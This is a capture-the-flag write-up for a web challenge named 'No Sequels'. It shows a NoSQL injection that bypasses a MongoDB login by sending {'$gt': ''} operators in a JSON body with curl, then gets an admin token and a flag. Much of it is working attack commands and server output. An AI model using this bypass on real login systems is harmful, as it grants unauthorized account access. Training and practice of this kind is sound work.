# No Sequels
Web

## Challenge 
The prequels sucked, and the sequels aren't much better, but at least we always have the original trilogy.

Author: SirIan

## Hint
MongoDB is a safer alternative to SQL, right?

## Solution

Reference:

- https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html
- https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/
- http://www.weirdnano.com/2014/01/24/cURL-data-post-request-command-line/

Failed post data

	'username={"&ne": ""}&password={"&ne": ""}'
	'username[$gt]=&password[$gt]='

Successful when using json as the content type.

	$ curl https://nosequels.2019.chall.actf.co/login 
		--cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1OTQ4NDY4fQ.mqy5QD30zEW_1q8tPiQ5nwT0_QDK-Jt7Pjx_U60ufN4;' 
		--data '{"username": "a", "password":"b"}' 
		-H "Content-Type: application/json"
	Wrong username or password


	$ curl https://nosequels.2019.chall.actf.co/login 
		--cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1OTQ4NDY4fQ.mqy5QD30zEW_1q8tPiQ5nwT0_QDK-Jt7Pjx_U60ufN4;' 
		--data '{"username": {"$gt": ""}, "password": {"$gt": ""}}' 
		-H "Content-Type: application/json" -v

	< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE1NTU5NDk1NTB9.WfYVmx7JWXsqWvU97PPRGjklNZ8ShOWoViiHF3V26WQ; Path=/
	Found. Redirecting to /site


Use the new cookie and resubmit the query. I added -L to follow the redirect.

	$ curl https://nosequels.2019.chall.actf.co/login --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE1NTU5NDk2OTJ9.M2F2Zq4esATeJhBhQby2b3XJRJNLZxpUacVIMmJW9O0;' --data '{"username": {"$gt": ""}, "password": {"$gt": ""}}' -H "Content-Type: application/json" -v -L

	<h2>Here's your first flag: actf{no_sql_doesn't_mean_no_vuln}<br>Access granted, however suspicious activity detected. Please enter password for user<b> 'admin' </b>again, but there will be no database query.</h2>


	
## Flag

	actf{no_sql_doesn't_mean_no_vuln}
